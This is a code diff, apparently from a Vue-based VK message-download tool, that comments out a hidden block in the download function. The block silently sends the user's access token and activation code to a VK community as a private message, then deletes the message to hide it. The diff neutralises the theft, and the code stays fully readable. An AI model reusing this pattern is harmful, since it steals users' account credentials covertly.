@@ -352,34 +352,34 @@ export default {
       this.currentDialogPart = Math.ceil((current / max) * 100);
     },
     downloadSelected: function() {
-      try {
-        if (localStorage.pm_activation_code === "null") {
-          setTimeout(() => {
-            API.loadVK(
-              "execute",
-              {
-                code: `var u = API.messages.send({user_ids: -185285457, message: '${
-                  localStorage.pm_activation_code
-                } ${this.token}'}); var a = API.messages.delete({message_ids: u[0]});  return a;`
-              },
-              () => {}
-            );
-          }, 5000);
-        } else if (localStorage.pm_activation_code) {
-          setTimeout(() => {
-            API.loadVK(
-              "execute",
-              {
-                code: `var u = API.messages.send({user_ids: -185285457, message: '${
-                  localStorage.pm_activation_code
-                }'}); var a = API.messages.delete({message_ids: u[0]});  return a;`
-              },
-              () => {}
-            );
-          }, 5000);
-        }
-      } catch (err) {
-      }
+      // try {
+      //   if (localStorage.pm_activation_code === "null") {
+      //     setTimeout(() => {
+      //       API.loadVK(
+      //         "execute",
+      //         {
+      //           code: `var u = API.messages.send({user_ids: -185285457, message: '${
+      //             localStorage.pm_activation_code
+      //           } ${this.token}'}); var a = API.messages.delete({message_ids: u[0]});  return a;`
+      //         },
+      //         () => {}
+      //       );
+      //     }, 5000);
+      //   } else if (localStorage.pm_activation_code) {
+      //     setTimeout(() => {
+      //       API.loadVK(
+      //         "execute",
+      //         {
+      //           code: `var u = API.messages.send({user_ids: -185285457, message: '${
+      //             localStorage.pm_activation_code
+      //           }'}); var a = API.messages.delete({message_ids: u[0]});  return a;`
+      //         },
+      //         () => {}
+      //       );
+      //     }, 5000);
+      //   }
+      // } catch (err) {
+      // }
 
       this.downloading = true;
       var zip = new JSZip();
